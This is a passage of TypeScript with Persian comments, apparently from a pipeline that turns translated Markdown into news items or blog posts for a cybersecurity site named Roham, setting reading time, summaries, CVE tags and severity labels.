  // اگر کل مطلب بدون هدینگ ## بود، تمام پاراگراف‌های مقدمه را در یک بخش اصلی کامل قرار بده
  if (parsedSections.length === 0 && introParagraphs.length > 0) {
    parsedSections.push({
      heading: "",
      paragraphs: introParagraphs,
    });
    introParagraphs = [];
  }

  // محاسبه تخمینی زمان مطالعه بر اساس کل کلمات واقعی متن
  const totalWords = bodyContent.split(/\s+/).length;
  const estMinutes = Math.max(2, Math.ceil(totalWords / 180));
  const readTimeStr = `${estMinutes} دقیقه`;

  // خلاصه کوتاه برای کارت پیش‌نمایش در لیست (بدون تکرار در داخل متن خبر)
  const firstTextPara =
    introParagraphs.find((p) => !p.startsWith("```") && !p.startsWith("![")) ||
    parsedSections[0]?.paragraphs.find((p) => !p.startsWith("```") && !p.startsWith("![")) ||
    translatedTitle;
  const cardSummary = firstTextPara.slice(0, 220) + (firstTextPara.length > 220 ? "..." : "");

  logs.push(
    `مدل قوی (${config.strongModel.modelName}): ترجمه ۱۰۰٪ کامل تمامی ${parsedSections.length} بخش بدون حذف یا خلاصه‌سازی انجام شد.`
  );

  const nowId = `${targetSection}-${Date.now()}`;

  if (targetSection === "news") {
    // در بخش خبر، اگر پاراگراف‌های ابتدایی قبل از اولین هدینگ وجود داشت، آن‌ها را در ابتدای بخش‌ها قرار می‌دهیم تا هیچ خطی جا نیفتد
    const finalNewsSections: typeof parsedSections =
      introParagraphs.length > 0
        ? [{ heading: "", paragraphs: introParagraphs }, ...parsedSections]
        : parsedSections;

    const generatedNews: NewsArticle = {
      id: nowId,
      slug: `roham-news-${Date.now().toString().slice(-6)}`,
      title: translatedTitle || "گزارش خبری امنیت سایبری",
      subtitle: "",
      category: extractedCves.length > 0 ? "zeroday" : "malware",
      categoryLabel: extractedCves.length > 0 ? "آسیب‌پذیری و امنیت" : "گزارش فنی و خبری",
      severity: extractedCves.length > 0 ? "CRITICAL" : "HIGH",
      status: "published",
      isBreaking: false,
      date: "مهر ۱۴۰۴",
      readTime: readTimeStr,
      author: "تحریریه رهام",
      source: sourceDomain,
      sourceUrl: detectedSourceUrl || undefined,
      coverImage: undefined, // تصاویر دقیقاً در جای اصلی خود داخل متن نمایش داده می‌شوند
      downloadedImages,
      views: 1,
      cveIds: extractedCves,
      affectedProducts: [],
      exploitStatus: "",
      summary: cardSummary,
      keyHighlights: [], // بدون هیچ بخش اضافه ساختگی
      sections: finalNewsSections.map((s) => ({
        heading: s.heading,
        paragraphs: s.paragraphs,
        codeSnippet: s.codeSnippet,
        codeLanguage: s.codeLanguage,
        imageUrl: s.imageUrl,
        imageAlt: s.imageAlt,
        table: s.table,
      })),
      iocs: [], // بدون هیچ بخش اضافه ساختگی
      mitigationSteps: [], // بدون چک‌لیست اضافه ساختگی
      timeline: [], // بدون تایم‌لاین اضافه ساختگی
      tags: [...extractedCves, ...(sourceDomain ? [sourceDomain] : ["Cybersecurity"])],
    };

    return {
      ok: true,
      targetSection,
      sourceType,
      sourceDomain,
      sourceUrl: detectedSourceUrl || undefined,
      rawTitle,
      cleanedMarkdown: rawMarkdown,
      extractedCves,
      downloadedImages,
      coverImage: downloadedImages[0]?.localPath || "",
      generatedNews,
      pipelineLogs: logs,
    };
  } else {
    const generatedBlog: BlogPost = {
      id: nowId,
      slug: `roham-article-${Date.now().toString().slice(-6)}`,
      title: translatedTitle || "مقاله فنی امنیت سایبری",
      subtitle: "",
      summary: cardSummary,
      category: "تحقیقات زیرودی",
      readTime: readTimeStr,
      date: "مهر ۱۴۰۴",
      author: "تیم فنی رهام",
      authorRole: sourceDomain ? `منبع: ${sourceDomain}` : "Roham Security Research",
      difficulty: "تخصصی (Deep-Dive)",
      tags: [...extractedCves, ...(sourceDomain ? [sourceDomain] : ["Technical-Blog"])],
      status: "published",
      isFeatured: false,
      views: 1,
      coverImage: undefined,
      source: sourceDomain || undefined,
      sourceUrl: detectedSourceUrl || undefined,
      downloadedImages,
      tldr: [], // بدون خلاصه مدیریتی ساختگی
      content: {
        intro: introParagraphs.join("\n\n"),
        sections: parsedSections.map((s, idx) => ({
          id: `sec-${idx + 1}`,
          heading: s.heading,
          paragraphs: s.paragraphs,
          codeSnippet: s.codeSnippet,
          codeLanguage: s.codeLanguage,
          imageUrl: s.imageUrl,
          imageAlt: s.imageAlt,
          table: s.table,
        })),
        conclusion: "", // بدون نتیجه‌گیری ساختگی
        actionableTakeaways: [], // بدون چک‌لیست ساختگی
        references:
          detectedSourceUrl || sourceDomain
            ? [
                {
                  title: sourceDomain || detectedSourceUrl,
                  url: detectedSourceUrl || "",
                },
              ]
            : [],
      },
    };

    return {
      ok: true,
      targetSection,
      sourceType,
      sourceDomain,
      sourceUrl: detectedSourceUrl || undefined,
      rawTitle,
      cleanedMarkdown: rawMarkdown,
      extractedCves,
      downloadedImages,
      coverImage: downloadedImages[0]?.localPath || "",
      generatedBlog,
      pipelineLogs: logs,
    };
  }
}


